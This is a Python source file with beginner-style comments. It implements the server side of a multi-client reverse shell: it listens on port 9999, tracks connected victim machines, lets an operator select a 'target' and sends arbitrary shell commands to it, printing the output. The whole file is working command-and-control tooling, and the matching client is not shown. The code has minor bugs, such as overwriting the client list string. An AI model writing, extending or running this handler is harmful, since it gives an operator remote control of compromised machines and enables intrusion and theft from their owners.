import socket
import sys
import threading        # For doing multiple task such as (1) Listen & Accept connections (2) sending commands to an already connected client
import time
from queue import Queue     # To maintain the threading queue


# Creating Threads

NUMBER_OF_THREADS = 2    # 2 Bcz two thread. (1) connecting multiple client (2) sending commands to multiple client
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []        # connection such as sending command and close command output will store here
all_address = []            # connection IP & Port will store here


# Creating a Socket(connect two computer)

def create_Socket():

    try:                # try except if socket fails to connect
        global host       # host=ip address
        global port
        global soc        # soc=Socket

        host = ""           # "" empty bcz it will be server's ip
        port = 9999         # can be any port, best to use less busy port
        soc = socket.socket() # creating socket

    except socket.error as msg:     # why not connecting msg
        print("Socket connection error :" + str(msg))

# Binding socket and listening connection (binding needed for stable connection)


def bind_socket():
    try:                # try except if socket fails to connect
        global host       # host=ip address
        global port
        global soc
        print("Binding the port: " + str(port))
        soc.bind((host, port))
        soc.listen(5)       # listen func used to listen from client.after 5 times trying it will show error

    except socket.error as msg:     # why not connecting msg
        print("Socket connection error :"+ str(msg) + "\n" + "Retring.....")
        bind_socket()       # It will retry to connect again,its called recurraction

# Thread-1
# Handling connection from multiple clients and saving them into all_connection() an all_address() functions in a list formate
# Closing previous connection when server.py file is restarted


def accepting_connection():
    for c in all_connections:  # This for loop closes all the previous connection  when server.py file is restarted
        c.close()

    del all_connections[:]  # Deletes the previous list,[:] this means all connection
    del all_address[:]      # Deletes the previous address

    while True:             # Infinite loop to accept and keeps the connection from multiple clients
        try:
            conn, address = soc.accept()
            soc.setblocking(1)          # 1 means true, and it prevents timeout never happens if no commands is sent to client

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established : " + address[0])

        except:
            print("Error accepting connections")

# 2nd Thread - 1) See all the client 2) Select a client from list 3) Send command to the selected / connected client
# Interactive command prompt for sending commands (Server Shell)
# server shell> list
# select 1 or 2 or...... [from connected list of client]
# Creating the interactive customized shell/command prompt for server


def start_server_shell():

    while True:
        cmd = input("Sever Shell> ")
        if cmd == 'list':

            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)

            if conn is not None:            # This if func check the connection is exist or not
                send_target_commands(conn)

            else:
                print("Command not recognized")

# This function Displays all currently active connected clients
# "i" in for loop is the number of id of clients (ex:0,1,2...)
# enumerate is a special key word that help to automatically create i variable and stores data in it and also shorten the code
# ----------Enumerate-----------
# i=0
# for conn in all_connections
# i=+1
# --------------------------------
# in for loop it tries to connect and send  and also receive data from client to establish the connection


def list_connections():

    results = ''

    for i, conn in enumerate(all_connections):

        try:
            conn.send(str.encode(' '))
            conn.recv(20480)           # 201480 bcz so that it can receive big data

        except:

            del all_connections[i]      # Delete previous connection
            del all_address[i]          # Delete previous id
            continue                    # loop back to for loop and tries to reconnect again

        results = str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"  # results : 0 ip address port


    print("------Connected Clients---------" + "\n" + results)
    print("To select any id please write \"select\" and id no. ex: Select 0 "+"\n")


# Selecting the target function [ get_target(cmd)]
def get_target(cmd):

    try:
        target = cmd.replace('select', '')   # target = Id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to : " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")         # ip > , (Ex: 192.168.0.2 > )
        return conn

    except:
        print("Selection is not valid")
        return None


# Send commands to selected client function

def send_target_commands(conn):

    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), 'utf-8')
                print(client_response, end="")
        except:
            print("Error sending commands !!!")
            break


# Create workers Threads

def crerate_workers():

    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True                     # Closes the program after the job is done
        t.start()


# Do next job that is in queue (Thread-1: handle connection, Thread-2: Sending commands)

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_Socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_server_shell()
        queue.task_done()


def create_jobs():

    for x in JOB_NUMBER:

        queue.put(x)
    queue.join()


crerate_workers()
create_jobs()


